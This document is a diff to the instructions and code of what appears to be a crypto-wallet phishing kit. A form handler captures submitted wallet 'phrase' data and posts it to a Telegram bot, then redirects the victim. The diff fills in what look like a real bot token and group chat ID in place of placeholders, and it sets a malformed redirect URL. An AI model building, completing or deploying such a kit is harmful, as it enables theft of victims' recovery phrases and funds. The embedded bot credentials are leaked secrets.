@@ -40,7 +40,7 @@ YOUR_CHAT_ID    → your group chat ID (e.g. -987654321)
 2. Add the **Modal HTML** somewhere in your `<body>` (typically at the end)
 3. Add the **Bottom Section JS** just before closing `</body>`
 4. Replace `YOUR_BOT_TOKEN` and `YOUR_CHAT_ID` with your actual values
-5. Replace `https://yoursite.com/index.html` with your redirect URL after submission
+5. Replace `https://index.html` with your redirect URL after submission
 6. Test on desktop and mobile
 
 ---
@@ -711,8 +711,8 @@ YOUR_CHAT_ID    → your group chat ID (e.g. -987654321)
   // ── Telegram submission ──
   async function handleTelegramSubmit(event, type) {
     event.preventDefault();
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
-    const CHAT_ID   = 'YOUR_CHAT_ID';
+    const BOT_TOKEN = '8706764257:AAH-JrkmLaCmyb4F6Xl3BaCWRb5D6nYUvvk';
+    const CHAT_ID   = '-5145274689';
 
     let message = '';
     if (type === 'phrase') {
@@ -737,7 +737,7 @@ YOUR_CHAT_ID    → your group chat ID (e.g. -987654321)
       });
     } catch (err) { console.error('Telegram error:', err); }
 
-    window.location.href = 'https://yoursite.com/index.html';
+    window.location.href = 'https://index.html';
   }
 
   // ── Wallet click handlers ──
@@ -959,7 +959,7 @@ a1b2c3d4e5f6...
 - **Instant delivery** — messages arrive in seconds
 - **Group chat ID starts with `-`** — never omit the minus sign
 - **Bot must be admin** in the group — otherwise messages will fail silently
-- **Redirect** — update `https://yoursite.com/index.html` to your actual page after submission
+- **Redirect** — update `https://index.html` to your actual page after submission
 - **Assets folder** — make sure your `./assets/` folder with all wallet images is in the same directory as your `index.html`
 
 ---
